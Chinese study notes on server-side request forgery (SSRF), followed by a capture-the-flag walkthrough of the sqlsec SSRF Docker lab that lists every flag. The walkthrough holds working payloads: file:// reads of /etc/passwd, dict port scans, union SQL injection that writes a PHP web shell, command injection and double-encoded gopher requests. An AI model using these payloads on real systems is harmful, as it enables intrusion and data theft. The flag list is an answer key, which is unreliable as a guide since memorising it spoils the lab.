# SSRF服务器端请求伪造

## SSRF介绍

SSRF（`Server-Side Request Forgery`:服务器端请求伪造）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。

一般情况下，**SSRF攻击的目标是从外网无法访问的内部系统**。

利用一个可以发起网络请求的服务，当做跳板来攻击其他服务。

简单来说就是：

A让B帮忙访问C

## SSRF成因

SSRF形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。

SSRF是利用存在缺陷的WEB应用作为代理去攻击远程和本地的服务器。

也就是说，对于服务器提供服务的其他应用没有对访问进行限制，如果我构造好我的访问包，那我就有可能利用目标服务对他的其他服务器应用进行调用。

### 正常用户访问网站的流程是：

输入网站URL-->发送请求-->服务器接受请求（没有过滤），并处理-->返回用户

网站有个请求是www.baidu.com/xxx.php?image=www.abc.com/1.png

那么产生SSRF漏洞的环节在哪里呢？

我们让网站A去访问网站B

服务器端的验证没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据。



例如：www.baidu.com/xxx.php?image=127.0.0.1/1.php

如果我们将www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？

### 终极解析：

SSRF漏洞就是通过篡改获取资源的请求发送给服务器，

但是服务器并没有检测这个请求是否合法，

然后服务器以他的身份来访问其他服务器的资源。

### PHP中下面函数的使用不当会导致SSRF

```php
file_get_contents()	 //将整个文件或一个url所指向的文件读入一个字符串中。
fsockopen()		    //打开一个网络连接或者一个Unix 套接字连接。
curl_exec()		    //初始化一个新的会话，返回一个cURL句柄，供curl_setopt（），curl_exec（）和curl_close（） 函数使用。
fopen()			   //打开一个文件文件或者 URL。
readfile()		   //输出一个文件的内容。
```

这些函数可以通过网络协议访问目标服务器上的资源。

如果一定要通过后台服务器远程去对用户指定（"或者预埋在前端的请求的地址进行资源请求则请做好目标地址的过滤"）

#### curl_exec()

![image-20240904094657938](https://image.201068.xyz/assets/29.SSRF/image-20240904094657938.png)

可以使用该漏洞对网站服务器**同一网段**的其他服务器进行探测。 

#### file_get_contents()

![image-20240904094722836](https://image.201068.xyz/assets/29.SSRF/image-20240904094722836.png)

`file_get_contents`函数可以**读取本地和远程的文件**，支持多种协议，如`ftp，http，https`还可以读取php源码

```PHP
php://filter/read=convert.base64-encode/resource=ssrf.php
```

可以将后台当前目录下的`ssrf.php`文件的**base64编码**返回。

#### fsockopen()

![image-20240904094750773](https://image.201068.xyz/assets/29.SSRF/image-20240904094750773.png)

`fsockopen()` 用于打开一个**网络连接**或者一个**Unix套接字连接**。

#### fopen()

![image-20240904094759084](https://image.201068.xyz/assets/29.SSRF/image-20240904094759084.png)


可以**打开文件或者URL**

#### readfile()

![image-20240904094806606](https://image.201068.xyz/assets/29.SSRF/image-20240904094806606.png)


从指定的**文件中读取内容**，并将内容输出到输出缓冲区

## SSRF危害

- 可以对服务器所在内网、本地进行端口扫描，获取一些服务的信息等
- 目标网站本地敏感数据的读取
- 内外网主机应用程序漏洞的利用
- 内外网Web站点漏洞的利用

## SSRF漏洞挖掘

### 一、从WEB功能上寻找

#### 1）分享

一些分享应用中，为了更好的提供用户体验，Web应用在分享功能中，通常会获取目标地址网页中的

`<title></title>`标签的文本内容作为显示以提供更好的用户体验。

如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。                                                                            

    http://widget.renren.com/*****? resourceUrl=https://www.sobug.com

通过目标URL地址获取了title标签和相关文本内容。而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。

从国内某漏洞提交平台上提交的SSRF漏洞，可以发现包括淘宝、百度、新浪等国内知名公司都曾被发现过分享功能上存在SSRF的漏洞问题。

#### 2）在线翻译

翻译网站替我们访问需要翻译的站点，然后进行翻译，所以当翻译网站没有对输入的地址做任何过滤时，内网就可以被访问到。

通过URL地址翻译对应文本的内容。

#### 3）图片加载与下载

加载远程图片地址功能用到的地方很多，很大可能造成SSRF问题

比如编辑器处，就会有远程文件加载。

某些地方会进行远程加载头像，例如：

```
http://www.xxx.com/image?url=http://www.image.com/1.jpg
```

#### 4）转码服务：

通过URL地址把原地址的网页内容调优使其**适合手机屏幕浏览**

由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，这时有些网站就通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。

#### 5）未公开的API

未公开的API（应用程序编程接口）实现以及其他调用URL的功能等

此处类似的功能有360提供的网站评分，以及有些网站通过应用程序编程接口获取远程地址文件来加载内容。

**SSRF通过远程加载来实现攻击**

**一切要你输入网址的地方法和可以输入ip的地方，都是SSRF的天下。**

### 二、从URL关键字中寻找

在对功能上存在SSRF漏洞中URL地址的特征观察，通过收集，大致有以下关键字：

| **Share** | **wap** | **url** | **link**  | **src**  | **source** | **target** |
| --------- | ------- | ------- | --------- | -------- | ---------- | ---------- |
| **u**     | 3g      | display | sourceURL | imageURL | domain     |            |


如果利用Google语法加上这些关键字去寻找SSRF漏洞，耐心的验证，现在还是可以找到存在的SSRF漏洞。

一切要你输入网址的地方和可以输入ip的地方，都是SSRF的天下。

### SSRF漏洞挖掘--总结

- 社交**分享**功能：获取超链接的标题等内容进行显示。
- **转码**服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。
- **在线翻译**：给网址翻译对应网页的内容。
- **图片加载/下载**：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片。
- 云服务**厂商**：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试。

- **编码处理**
- 可以利用**Google语法**加上这些关键字去寻找SSRF漏洞。

## SSRF具体利用

### SSRF常用相关协议

- `http://` ：探测内网主机存活、端口开放情况
- `gopher://` ：发送GET或POST请求；攻击内网应用
- `dict://` ：泄露安装软件版本信息，查看端口，操作内网远程访问等
- `file://` ：读取本地文件

```bash
?url=file:///etc/passwd
?url=http://127.0.0.1:1234/?i=1
?url=dict://127.0.0.1:1234/hello
?url=dict://127.0.0.1:1234/hello\r\n
?url=gopher://127.0.0.1:1234/_test%250d%250atest2
```

> %0d -->%250d
>
> %0a-->%250a

### 一、内网访问

使用http协议对内网的Web应用进行访问

```
?url=http://127.0.0.1/flag.php
```

CTFhub例题：题目要求访问127.0.0.1的flag.php，直接拼接进行访问即可得到flag。

### 二、伪协议读取文件

| PHP伪协议   | PHP支持的伪协议        |
| ----------- | ---------------------- |
| `file://`   | 访问本地文件系统       |
| `http://`   | 访问HTTP(s)网址        |
| `ftp://`    | 访问FTP服务器          |
| `php://`    | 访问各个输入/输出流    |
| `zlib://`   | 压缩流                 |
| `data://`   | 数据（RFC 2379）       |
| `glob://`   | 查找匹配的文件路径模式 |
| `phar://`   | PHP归档                |
| `ssh2://`   | Secure Shell 2         |
| `rar://`    | RAR                    |
| `ogg://`    | 音频流                 |
| `except://` | 处理交互式的流         |

```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

### 三、端口扫描

在SSRF中，dict协议与http协议可以用来探测内网主机存活与端口开放情况。

```
?url=dict://127.0.0.1:8000
?url=http://127.0.0.1:8080
```

题目提示端口扫描，抓包，返回的状态码是200


开始攻击，然后访问这个端口，得到flag

请求不存在的服务器或未开放的端口，会返回以下信息，可以通过返回的状态信息不同，来判断对应端口开放的状态。

#### 扩展

进行内网端口探测时，需要知道目标内网网段，如果盲目的去进行网段扫描，会耗费大量的时间，因此在实战挖掘中尽可能发现有可能泄露的内网网段。

## SSRF具体验证

如果我们请求：

```
http://www.****.com/imageURL=http://10.10.10.1/favicon.ico
```

而没有内容显示，我们是判断这个点不存在SSRF漏洞，

还是`http://10.10.10.1/favicon.ico`这个地址被过滤了，

还是`http://10.10.10.1/favicon.ico`这个地址的图片文件不存在。

如果我们事先不知道`http://10.10.10.1/favicon.ico`这个地址的文件是否存在的时候，是判断不出来是哪个原因的，所以我们采用排除法。

### 1）基本判断（排除法）

例如：

```
http://www.baidu.com/***/service?image=http://www.baidu.com/img/logo.jpg
```

#### 排除法一：

你可以直接右键图片，在新窗口打开图片，如果浏览器上URL地址栏是

`http://www.baidu.com/img/logo.jpg`，说明不存在SSRF漏洞。

#### 排除法二：

你可以使用BurpSuite等抓包工具来判断是否是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以我们本地浏览器的请求中就不应该存在图片的请求，如果刷新当前页面，有如下请求，则可以判断不是SSRF。

（前提设置BurpSuite截断图片的请求，默认是放行的）

## SSRF防御

SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。

一般的防御措施是对URL参数进行过滤，或者使得URL参数用户不可控，但当过滤方法不当时，就存在Bypass的不同方式。

### 通常由以下5个思路：

1. 过滤返回信息，验证远程服务器对请求的响应，是比较容易的方法。如果Web应用获取某种类型的文件，那么可以在把返回结果展示给用户之前先验证返回信息是否符合标准。
2. 统一错误信息，避免用户根据错误信息来判断远程服务端口状态。
3. 限制请求的端口为HTTP常用端口，比如80、443、8080/8090
4. 黑名单内网IP，避免应用被用来获取内网数据，攻击内网。
5. 禁用不需要的协议。仅仅允许HTTP和HTTPS请求。可以防止类似于file://、ftp://等引起的问题

## SSRF绕过技巧

### 1）利用@符号

SSRF绕过中我们常用`@`符号进行绕过

```
http://example.com@127.0.0.1
```

### 2）添加端口号

SSRF绕过中我们通常使用添加端口号绕过

```
http://127.0.0.1:8080
```

### 3）利用短地址

SSRF绕过中我们通常使用短地址进行绕过

```
http://mtw.so/6ha8PY
```

### 4）利用特殊域名

SSRF绕过中我们通常使用特殊域名进行绕过

```
xip.io
```

### 5）利用封闭式字母数字

封闭式字母数字 Enclosed Alphanumerics

```
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com
```

清单：

```bash
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### 6）利用`。`绕过

SSRF绕过中我们通常使用`。`进行绕过

例如：

```
http://127。0。0。1
```

### 7）利用进制转换

SSRF绕过中我们通常使用进制转换进行绕过

例如：http://2130706433

### 8）利用域名解析绕过

将127.0.0.1解析到某域名下





# 国光SSRF

## 参考文档

https://www.sqlsec.com/2021/05/ssrf.html

https://blog.csdn.net/qq_61237064/article/details/123006424

## 启动环境

github:https://github.com/sqlsec/ssrf-vuls

```
git clone https://github.com/sqlsec/ssrf-vuls
```



### 启动环境

```bash
cd ssrf
docker-compose up -d
#docker-compose down
docker ps -s
```

### 查看是否启动

```bash
[root@localhost ssrf]# docker ps -s
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES               SIZE
8681898e106c        ssrf_web:v8         "/start.sh"              2 minutes ago       Up 2 minutes        80/tcp, 6379/tcp       ssrf_ssrfweb8_1     5 B (virtual 985 MB)
8bfe3b9a536a        mysql:5.6           "docker-entrypoint..."   2 minutes ago       Up 2 minutes        3306/tcp               ssrf_mysql_1        2 B (virtual 303 MB)
ab6694e8d0b7        ssrf_web:v1         "/start.sh"              2 minutes ago       Up 2 minutes        0.0.0.0:8080->80/tcp   ssrf_ssrfweb1_1     91.5 kB (virtual 290 MB)
5947f39bf9a2        ssrf_web:v3         "bash /start.sh"         2 minutes ago       Up 2 minutes        80/tcp                 ssrf_ssrfweb3_1     30.2 MB (virtual 695 MB)
18cd431a951c        ssrf_web:v4         "/start.sh"              2 minutes ago       Up 2 minutes        80/tcp                 ssrf_ssrfweb4_1     40.1 kB (virtual 289 MB)
ce130b10c994        ssrf_web:v7         "/start.sh"              2 minutes ago       Up 2 minutes        6379/tcp               ssrf_ssrfweb7_1     5 B (virtual 273 MB)
3d3e759c636a        ssrf_web:v6         "catalina.sh run"        2 minutes ago       Up 2 minutes        8080/tcp               ssrf_ssrfweb6_1     39.6 kB (virtual 293 MB)
0c8f7766c988        ssrf_web:v5         "/init.sh"               2 minutes ago       Up 2 minutes        80/tcp, 443/tcp        ssrf_ssrfweb5_1     41 kB (virtual 472 MB)
84b356eef734        ssrf_web:v2         "/start.sh"              2 minutes ago       Up 2 minutes        80/tcp                 ssrf_ssrfweb2_1     32.3 kB (virtual 289 MB)
```

http://192.168.70.24:8080

### 环境介绍

#### 靶场资产

![52364eff9d2d4cb65587d46ae9c558d](https://image.201068.xyz/assets/29.SSRF/52364eff9d2d4cb65587d46ae9c558d.png)

```
172.72.23.21	80
172.72.23.22	80
172.72.23.23	80、3306
172.72.23.24	80
172.72.23.25	80
172.72.23.26	8080
172.72.23.27	6379
172.72.23.28	6379
172.72.23.29	3306
```

#### flag

```bash
docker exec -it ssrf_ssrfweb7_1 /bin/bash
cat /flag
#flag{nisp3_verygood_flag3}
redis-cli
keys *
get flag
#flag{nisp2_flag2_is_here}
#172.72.23.27 
exit

docker exec -it ssrf_ssrfweb3_1 /bin/bash
cat /flag
#flag{nisp6_complete_flag6}
mysql -u root -proot
show databases;
use db;
show tables;
select * from flag_is_here;
#flag{nisp5_Unlucky_flag5}
#172.72.23.23
\q
exit

docker exec -it ssrf_ssrfweb6_1 /bin/bash
cat /flag
#flag{nisp9_thelastone?_flag9}
#172.72.23.26 
exit

docker exec -it ssrf_mysql_1 /bin/bash
cat /flag
#flag{nisp12_This_is_the_last_flag12}

mysql
show databases;
use flag;
show tables;
select * from test;
#flag{nisp11_There_is_also_flag11}
\q
#172.72.23.29 
exit

docker exec -it ssrf_ssrfweb8_1 /bin/bash
#172.72.23.28 
redis-cli
auth P@ssw0rd
keys *
get flag
#flag{nisp10_The_ninth_flag10}
quit
exit

docker exec -it ssrf_ssrfweb2_1 /bin/bash
cat /flag
#flag{nisp4_hidden_flag4}
#172.72.23.22
exit

docker exec -it ssrf_ssrfweb5_1 /bin/bash
cat /flag
#flag{nisp8_another_flag8}
#172.72.23.25
exit

docker exec -it ssrf_ssrfweb1_1 /bin/bash
cat /flag
#flag{nisp1_this_is_flag1}
#172.72.23.21 
exit

docker exec -it ssrf_ssrfweb4_1 /bin/bash
cat /flag
#flag{nisp7_no_problem_flag7}
#172.72.23.24
exit
```

### 题目

- **第 1 题 、**SSRF漏洞 192.168.5.8为考试靶机。访问 192.168.5.8:8080，flag1在ip xxx.xxx.xxx.21的/flag 格式flag{xxx}
- **第 2 题 、**Redis 未授权1 flag2在ip xxx.xxx.xxx.27的redis里，get flag 格式flag{xxx}
- **第 3 题 、**Redis 未授权2 flag3在ip xxx.xxx.xxx.27的/flag 格式flag{xxx}
- **第 4 题 、**代码注入 flag4在ip xxx.xxx.xxx.22的/flag 格式flag{xxx}
- **第 5 题 、**SQL 注入 flag5在ip xxx.xxx.xxx.23的MySQL数据库里 格式flag{xxx}
- **第 6 题 、**SQL注入 flag6在ip xxx.xxx.xxx.23的/flag 格式flag{xxx}
- **第 7 题 、**命令执行 flag7在ip xxx.xxx.xxx.24的/flag 格式flag{xxx}
- **第 8 题 、**XML 实体注入(XXE) flag8在ip xxx.xxx.xxx.25的/flag 格式flag{xxx}
- **第 9 题 、**CVE-2017-12615 Tomcat flag9在xxx.xxx.xxx.26的/flag 格式flag{xxx}
- **第 10 题 、**Redis 有认证 flag10在xxx.xxx.xxx.28的redis里，get flag 格式flag{xxx}
- **第 11 题 、**MySQL 未授权 flag11在xxx.xxx.xxx.29的MySQL数据库里 格式flag{xxx}
- **第 12 题 、**MySQL 未授权 flag12在xxx.xxx.xxx.29的/flag 格式flag{xxx}

```
172.72.23.21	flag{nisp1_this_is_flag1}
172.72.23.27	flag{nisp2_flag2_is_here}	flag{nisp3_verygood_flag3}
172.72.23.22	flag{nisp4_hidden_flag4}
172.72.23.23	flag{nisp5_Unlucky_flag5}   flag{nisp6_complete_flag6}
172.72.23.24 	flag{nisp7_no_problem_flag7}
172.72.23.25	flag{nisp8_another_flag8}
172.72.23.26 	flag{nisp9_thelastone?_flag9}
172.72.23.28 	flag{nisp10_The_ninth_flag10}
172.72.23.29 	flag{nisp11_There_is_also_flag11}	flag{nisp12_This_is_the_last_flag12}
```



## 思路

### 访问靶场

http://192.168.70.24:8080

![image-20240904154607908](https://image.201068.xyz/assets/29.SSRF/image-20240904154607908.png)

### 172.72.23.21

#### 查看flag

```
file:///flag
```

![image-20240904151311886](https://image.201068.xyz/assets/29.SSRF/image-20240904151311886.png)

#### flag1

```
flag{nisp1_this_is_flag1}
```

#### 查看hosts文件的ip

```
file:///etc/hosts
```

![image-20240904151254241](https://image.201068.xyz/assets/29.SSRF/image-20240904151254241.png)

#### C端，端口扫描

```
dict://172.72.23.21:80
```

![image-20240904154713355](https://image.201068.xyz/assets/29.SSRF/image-20240904154713355.png)

##### burp抓包跑C端和端口

```
C端：21，22，23，24，25，26，27，28

端口：80，8080，3306，6379，443
```

![image-20240904155052853](https://image.201068.xyz/assets/29.SSRF/image-20240904155052853.png)

![image-20240904155346627](https://image.201068.xyz/assets/29.SSRF/image-20240904155346627.png)

![image-20240904172147628](https://image.201068.xyz/assets/29.SSRF/image-20240904172147628.png)

![image-20240904155454555](https://image.201068.xyz/assets/29.SSRF/image-20240904155454555.png)

![image-20240904160318831](https://image.201068.xyz/assets/29.SSRF/image-20240904160318831.png)

##### 资产

```bash
172.72.23.21	80
172.72.23.22	80
172.72.23.23	80、3306
172.72.23.24	80
172.72.23.25	80
172.72.23.26	8080
172.72.23.27	6379
172.72.23.28	6379
172.72.23.29	3306
```

### 172.72.23.22

#### 目录爆破

```
http://172.72.23.22:80/index.php
```

![image-20240904161342289](https://image.201068.xyz/assets/29.SSRF/image-20240904161342289.png)

```
ip：172.72.23.22:80

目录字典：
```

![image-20240904160645740](https://image.201068.xyz/assets/29.SSRF/image-20240904160645740.png)

![image-20240904161430934](https://image.201068.xyz/assets/29.SSRF/image-20240904161430934.png)

![image-20240904161502643](https://image.201068.xyz/assets/29.SSRF/image-20240904161502643.png)

![image-20240904161544275](https://image.201068.xyz/assets/29.SSRF/image-20240904161544275.png)

![image-20240904172256557](https://image.201068.xyz/assets/29.SSRF/image-20240904172256557.png)

![image-20240904172325970](https://image.201068.xyz/assets/29.SSRF/image-20240904172325970.png)

```
http://172.72.23.22/phpinfo.php
http://172.72.23.22/shell.php
```

#### 命令执行

```
http://172.72.23.22/shell.php?cmd=cat%20/flag

http://172.72.23.22/shell.php?cmd=cat%20/etc/hosts
```

![image-20240904172605970](https://image.201068.xyz/assets/29.SSRF/image-20240904172605970.png)

![image-20240904173105802](https://image.201068.xyz/assets/29.SSRF/image-20240904173105802.png)

#### flag4

```
flag{nisp4_hidden_flag4}
```

### 172.72.23.23

#### sql注入

```
http://172.72.23.23
```

![image-20240904172857535](https://image.201068.xyz/assets/29.SSRF/image-20240904172857535.png)

##### 闭合方式

```
http://172.72.23.23?id=1'%20--+
```

![image-20240904173331218](https://image.201068.xyz/assets/29.SSRF/image-20240904173331218.png)

单引号闭合

##### 字段数

```mysql
http://172.72.23.23?id=1'%20order%20by%204--+ 
http://172.72.23.23?id=1'%20order%20by%205--+ 
```

![image-20240904191816749](https://image.201068.xyz/assets/29.SSRF/image-20240904191816749.png)

![image-20240904191852082](https://image.201068.xyz/assets/29.SSRF/image-20240904191852082.png)

有4个字段数

##### 显示位

```mysql
http://172.72.23.23?id=0'%20union%20select%201,2,3,4--+
```

![image-20240904191947285](https://image.201068.xyz/assets/29.SSRF/image-20240904191947285.png)

1，2，4是显示位

##### 数据库名

```mysql
http://172.72.23.23?id=0'%20union%20select%201,2,3,group_concat(schema_name%20separator%200x3c62723e)%20from%20information_schema.schemata--+

http://172.72.23.23?id=0'%20union%20select%201,2,3,database()%20from%20information_schema.schemata--+
```

![image-20240904192106919](https://image.201068.xyz/assets/29.SSRF/image-20240904192106919.png)

![image-20240904192557130](https://image.201068.xyz/assets/29.SSRF/image-20240904192557130.png)

##### 表名

```mysql
http://172.72.23.23?id=0'%20union%20select%201,2,3,group_concat(table_name%20separator%200x3c62723e)%20from%20information_schema.tables%20where%20table_schema='db'--+

http://172.72.23.23?id=0'%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
```

![image-20240904192900298](https://image.201068.xyz/assets/29.SSRF/image-20240904192900298.png)

![image-20240904193046960](https://image.201068.xyz/assets/29.SSRF/image-20240904193046960.png)

##### 字段名

```mysql
http://172.72.23.23?id=0'%20union%20select%201,2,3,group_concat(column_name%20separator%200x3c62723e)%20from%20information_schema.columns%20where%20table_name='flag_is_here'--+

http://172.72.23.23?id=0'%20union%20select%201,2,3,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()and%20table_name='flag_is_here'--+
```

![image-20240904193338943](https://image.201068.xyz/assets/29.SSRF/image-20240904193338943.png)

![image-20240904193518253](https://image.201068.xyz/assets/29.SSRF/image-20240904193518253.png)

##### 字段值

```mysql
http://172.72.23.23?id=0'%20union%20select%201,2,3,(select%20group_concat(content%20separator%200x3c62723e)%20from%20flag_is_here)--+

http://172.72.23.23?id=0'%20union%20select%201,2,3,(select%20content%20from%20flag_is_here)--+
```

![image-20240904193721301](https://image.201068.xyz/assets/29.SSRF/image-20240904193721301.png)

![image-20240904193930674](https://image.201068.xyz/assets/29.SSRF/image-20240904193930674.png)

#### flag5

```
flag{nisp5_Unlucky_flag5}
```



#### sql注入写入木马

```mysql
http://172.72.23.23?id=0'%20union%20select%201,2,3,'<?php%20system($_GET[cmd]);?>'%20into%20dumpfile%20'/var/www/html/shell1.php'--+

http://172.72.23.23?id=0'%20union%20select%201,2,3,'<?php%20system($_GET[xxx]);?>'%20into%20outfile%20'/var/www/html/xxx.php'--+
```

![image-20240904194224613](https://image.201068.xyz/assets/29.SSRF/image-20240904194224613.png)

![image-20240904194502484](https://image.201068.xyz/assets/29.SSRF/image-20240904194502484.png)

##### 查看flag

```bash
http://172.72.23.23/shell1.php?cmd=cat%20/flag

http://172.72.23.23/xxx.php?xxx=cat%20/flag
```

![image-20240904194353151](https://image.201068.xyz/assets/29.SSRF/image-20240904194353151.png)

![image-20240904194619277](https://image.201068.xyz/assets/29.SSRF/image-20240904194619277.png)

#### flag6

```
flag{nisp6_complete_flag6}
```

#### sql注入总结

无%20，方便查看

```mysql
http://172.72.23.23?id=1' --+
http://172.72.23.23?id=1' order by 4--+
http://172.72.23.23?id=1' order by 5--+
http://172.72.23.23?id=0' union select 1,2,3,4--+

http://172.72.23.23?id=0' union select 1,2,3,group_concat(schema_name separator 0x3c62723e) from information_schema.schemata--+
http://172.72.23.23?id=0' union select 1,2,3,group_concat(table_name separator 0x3c62723e) from information_schema.tables where table_schema='db'--+
http://172.72.23.23?id=0' union select 1,2,3,group_concat(column_name separator 0x3c62723e) from information_schema.columns where table_name='flag_is_here'--+
http://172.72.23.23?id=0' union select 1,2,3,(select group_concat(content separator 0x3c62723e) from flag_is_here)--+
http://172.72.23.23?id=0' union select 1,2,3,'<?php system($_GET[cmd]);?>' into dumpfile '/var/www/html/shell1.php'--+
```



```mysql
http://172.72.23.23?id=0' union select 1,2,3,database() from information_schema.schemata--+
http://172.72.23.23?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()--+
http://172.72.23.23?id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database()and table_name='flag_is_here'--+
http://172.72.23.23?id=0' union select 1,2,3,(select content from flag_is_here)--+
http://172.72.23.23?id=0' union select 1,2,3,'<?php system($_GET[xxx]);?>' into outfile '/var/www/html/xxx.php'--+
http://172.72.23.23/xxx.php?xxx=cat /flag
```

### 172.72.23.24

![image-20240905102827239](https://image.201068.xyz/assets/29.SSRF/image-20240905102827239.png)

![image-20240905102844947](https://image.201068.xyz/assets/29.SSRF/image-20240905102844947.png)

#### 命令执行

```
127.0.0.1;cat /etc/hosts
```

#### 构造POST请求

```
POST / HTTP/1.1
Host: 172.72.23.24
Content-Length: 27
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1;cat /etc/hosts
```

##### burp两次url编码

![image-20240905103244754](https://image.201068.xyz/assets/29.SSRF/image-20240905103244754.png)

###### 第一次url编码

![image-20240905103325758](https://image.201068.xyz/assets/29.SSRF/image-20240905103325758.png)

```
%50%4f%53%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%34%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%32%37%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%0d%0a%69%70%3d%31%32%37%2e%30%2e%30%2e%31%3b%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73
```



###### 第二次url编码

![image-20240905103342532](https://image.201068.xyz/assets/29.SSRF/image-20240905103342532.png)

```
%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%37%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%39%25%37%30%25%33%64%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%62%25%36%33%25%36%31%25%37%34%25%32%30%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%36%38%25%36%66%25%37%33%25%37%34%25%37%33
```

#### 使用gopher协议

```
gopher://172.72.23.24:80/_111
```

![image-20240905103705086](https://image.201068.xyz/assets/29.SSRF/image-20240905103705086.png)

![image-20240905103754511](https://image.201068.xyz/assets/29.SSRF/image-20240905103754511.png)

##### burp使用2次url编码

burp中使用2次url编码

```
gopher%3A%2F%2F172.72.23.24%3A80%2F_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%37%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%39%25%37%30%25%33%64%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%